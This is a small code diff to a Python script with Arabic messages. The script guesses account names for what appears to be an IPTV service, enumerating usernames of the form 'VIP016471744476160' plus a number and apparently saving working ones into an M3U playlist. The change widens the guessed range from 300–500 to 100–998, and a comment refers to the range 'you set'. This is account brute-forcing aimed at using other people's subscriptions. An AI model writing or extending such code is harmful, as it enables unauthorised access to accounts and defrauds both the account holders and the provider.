@@ -35,7 +35,7 @@ def update_m3u_file(working_user):
 def start_fuzzing():
     print("🚀 جاري بدء عملية الفحص وتخمين الحسابات...")
     # النطاق الذي حددته أنت (300 إلى 500)
-    for i in range(300, 501):
+    for i in range(100, 999):
         target_user = f"VIP016471744476160{i}"
         print(f"🔎 فحص الحساب: {target_user}", end="\r")
         
